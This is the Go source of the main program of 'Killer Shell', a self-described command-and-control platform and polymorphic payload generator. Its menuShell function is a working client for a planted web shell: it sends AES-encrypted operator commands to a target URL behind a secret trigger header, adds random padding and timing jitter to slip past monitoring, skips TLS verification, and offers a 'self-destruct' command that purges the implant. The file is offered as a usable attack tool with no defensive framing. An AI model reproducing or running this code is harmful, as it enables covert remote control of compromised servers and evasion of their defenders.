package main

import (
	"bufio"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/ash7x-la/killer-shell/internal/builder"
	"github.com/ash7x-la/killer-shell/internal/crypto"
	"github.com/ash7x-la/killer-shell/internal/scanner"
)

// ANSI Colors
const (
	cyan   = "\033[36m"
	green  = "\033[32m"
	yellow = "\033[33m"
	red    = "\033[31m"
	purple = "\033[35m"
	reset  = "\033[0m"
	bold   = "\033[1m"
)

// Global Configuration
var (
	SessionFile = ".kshell_session"
)

type ConfigSession struct {
	Target  string `json:"target"`
	Header  string `json:"header"`
	Trigger string `json:"trigger"`
	Salt    string `json:"salt"`
}

func saveConfig(cfg ConfigSession) {
	data, _ := json.MarshalIndent(cfg, "", "  ")
	ioutil.WriteFile(SessionFile, data, 0600)
}

func loadConfig() (ConfigSession, error) {
	data, err := ioutil.ReadFile(SessionFile)
	if err != nil {
		return ConfigSession{}, err
	}
	var cfg ConfigSession
	err = json.Unmarshal(data, &cfg)
	return cfg, err
}

func main() {
	rand.Seed(time.Now().UnixNano())
	for {
		showBanner()
		fmt.Printf("\n> 1 < BUILD SHELL\n")
		fmt.Printf("> 2 < SCAN TARGET\n")
		fmt.Printf("> 3 < COMMAND CONTROL (C2)\n")
		fmt.Printf("> 4 < EXIT\n")
		fmt.Print("\n" + cyan + "kshell > " + reset)

		var choice string
		fmt.Scanln(&choice)

		switch choice {
		case "1":
			builder.BuildPayload()
		case "2":
			scanner.ScanTarget()
		case "3":
			menuShell()
		case "4":
			os.Exit(0)
		}
	}
}

func showBanner() {
	fmt.Print("\033[H\033[2J")
	fmt.Printf("%s", cyan) // Logo remains colored
	fmt.Println(` 
  _   __      _          _ _ 
 | | / /     | |        | | |
 | |/ /   ___| |__   ___| | |
 |    \  / __| '_ \ / _ \ | |
 | |\  \ \__ \ | | |  __/ | |
 \_| \_/ |___/_| |_|\___|_|_|`)
	fmt.Printf("%s", reset) // Everything else is white (default)
	fmt.Printf("\n Kshell Tools V1.0 | Design by ash7x\n")
	fmt.Printf("\n Killer Shell is a command and control platform and polymorphic payload generator designed for highly monitored environments. This version consolidates the power of a scanner, builder, and controller into a single, portable, standalone binary.\n")
}

func menuShell() {
	last, err := loadConfig()
	var target, hKey, hVal, saltHex string

	fmt.Printf("\n%s[ INSTANT ACCESS MODE ]%s\n", bold+yellow, reset)
	if err == nil {
		fmt.Printf("%s[i]%s Last Session: %s\n", cyan, reset, last.Target)
	}

	fmt.Print("URL [Enter for last]: ")
	fmt.Scanln(&target)

	if target == "" {
		if err != nil {
			fmt.Printf("%s[!] No previous session found.%s\n", red, reset)
			return
		}
		target = last.Target
		hKey = last.Header
		hVal = last.Trigger
		saltHex = last.Salt
	} else {
		if target == last.Target {
			hKey = last.Header
			hVal = last.Trigger
			saltHex = last.Salt
		} else {
			fmt.Print("Header Key: ")
			fmt.Scanln(&hKey)
			fmt.Print("Trigger: ")
			fmt.Scanln(&hVal)
			fmt.Print("Salt (HEX): ")
			fmt.Scanln(&saltHex)
		}
	}

	saveConfig(ConfigSession{Target: target, Header: hKey, Trigger: hVal, Salt: saltHex})

	salt, _ := hex.DecodeString(saltHex)
	key := sha256.Sum256(append([]byte(hVal), salt...))

	// Quick Handshake/Clear
	fmt.Print("\033[H\033[2J")
	fmt.Printf("%s[ K-SHELL SPAWNED ]%s\n", green, reset)
	fmt.Printf("Endpoint: %s\n", target)
	fmt.Println("Commands: 'exit' to menu, 'self-destruct' to kill agency.")

	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print(green + "pwn@Kshell ~ $ " + reset)
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)
		if cmd == "exit" {
			break
		}
		if cmd == "" {
			continue
		}

		effectiveCmd := cmd
		if cmd == "self-destruct" {
			effectiveCmd = "__PURGE__"
		}

		encryptedCmd := crypto.EncryptAES([]byte(effectiveCmd), key[:])
		payload := url.Values{}
		payload.Set("d", base64.StdEncoding.EncodeToString(encryptedCmd))

		// SURVIVAL v1.1: Data Padding & Jitter
		pKey := fmt.Sprintf("_%x", rand.Int63())
		pVal := fmt.Sprintf("%x", rand.Int63())
		payload.Set(pKey, pVal)

		jitter := time.Duration(300+rand.Intn(1200)) * time.Millisecond
		time.Sleep(jitter)

		req, _ := http.NewRequest("POST", target, strings.NewReader(payload.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set(hKey, hVal)
		req.Close = true

		client := &http.Client{Timeout: 30 * time.Second, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("%s[!] Error: %v%s\n", red, err, reset)
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()
		if len(body) == 0 {
			fmt.Printf("%s[!] Empty response%s\n", red, reset)
			continue
		}

		decoded, err := base64.StdEncoding.DecodeString(string(body))
		if err != nil {
			fmt.Printf("%s[!] Invalid Response (Size: %d). Use 'debug' to see raw content.%s\n", red, len(body), reset)
			if cmd == "debug" {
				fmt.Println(string(body))
			}
			continue
		}

		res := crypto.DecryptAES(decoded, key[:])
		if res == nil {
			fmt.Printf("%s[!] Decryption Failed%s\n", red, reset)
		} else {
			output := string(res)
			if output == "GHOST_VANISHED" {
				fmt.Printf("%s[!] Agent signal: GHOST_VANISHED. Connection closed.%s\n", yellow, reset)
				break
			}
			fmt.Println(output)
		}
	}
}
